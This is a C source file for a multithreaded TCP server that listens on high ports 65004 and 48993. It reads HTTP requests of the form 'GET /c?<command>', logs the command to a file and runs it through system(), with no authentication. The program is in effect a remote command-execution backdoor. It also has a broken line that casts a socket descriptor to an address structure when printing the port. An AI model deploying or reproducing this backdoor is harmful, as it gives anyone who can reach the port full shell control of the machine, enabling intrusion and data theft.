#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>

#define PRIMARY_PORT 65004
#define SECONDARY_PORT 48993
#define BUFFER_SIZE 1024

void *handle_client(void *arg) {
    int client_sock = *(int *)arg;
    char buffer[BUFFER_SIZE];
    char response[] = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nCommand Executed\n";
    
    memset(buffer, 0, sizeof(buffer)); 
    read(client_sock, buffer, sizeof(buffer));
    
    char *cmd_start = strstr(buffer, "GET /c?");
    if (cmd_start) {
        cmd_start += 6; // move past "GET /c"
        while (*cmd_start == '?' || *cmd_start == ' ') cmd_start++; // '?' or ' '
        char *cmd_end = strchr(cmd_start, ' ');
        if (cmd_end) {
            *cmd_end = '\0';
            char cmd[BUFFER_SIZE];
            snprintf(cmd, sizeof(cmd), "%s", cmd_start);
            
            // Replace '+' with ' ' in command
            for (char *p = cmd; *p; p++) {
                if (*p == '+') {
                    *p = ' ';
                }
            }
            FILE *log_file = fopen("log.txt", "a");
            if (log_file != NULL) {
                fprintf(log_file, "Command: %s\n", cmd);
                fclose(log_file);
            } else {
                perror("Failed to open log file");
            }

            system(cmd);
        }
    }
    write(client_sock, response, sizeof(response) - 1);
    
    close(client_sock);
    free(arg);
    return NULL;
}

int create_server_socket(int port) {
    int server_sock;
    struct sockaddr_in server;

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock == -1) {
        perror("Could not create socket");
        exit(EXIT_FAILURE);
    }
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    if (bind(server_sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Bind failed");
        close(server_sock);
        return -1;
    }

    listen(server_sock, 5);
    return server_sock;
}

int main() {
    int server_sock, client_sock, *new_sock;
    struct sockaddr_in client;
    socklen_t sockaddr_len = sizeof(struct sockaddr_in);

    server_sock = create_server_socket(PRIMARY_PORT);
    if (server_sock == -1) {
        printf("Primary port %d is in use. Trying secondary port %d...\n", PRIMARY_PORT, SECONDARY_PORT);
        server_sock = create_server_socket(SECONDARY_PORT);
        if (server_sock == -1) {
            perror("Could not bind to any port");
            exit(EXIT_FAILURE);
        }
    }

    printf("Server listening on port %d\n", ntohs(((struct sockaddr_in*)&server_sock)->sin_port));

    while ((client_sock = accept(server_sock, (struct sockaddr *)&client, &sockaddr_len))) {
        new_sock = malloc(sizeof(int));
        if (new_sock == NULL) {
            perror("Failed to allocate memory");
            close(client_sock);
            continue;
        }
        *new_sock = client_sock;
        
        pthread_t client_thread;
        if (pthread_create(&client_thread, NULL, handle_client, (void *)new_sock) < 0) {
            perror("Could not create thread");
            free(new_sock);
            close(client_sock);
        }
        
        pthread_detach(client_thread);
    }
    
    if (client_sock < 0) {
        perror("Accept failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }
    
    close(server_sock);
    return 0;
}
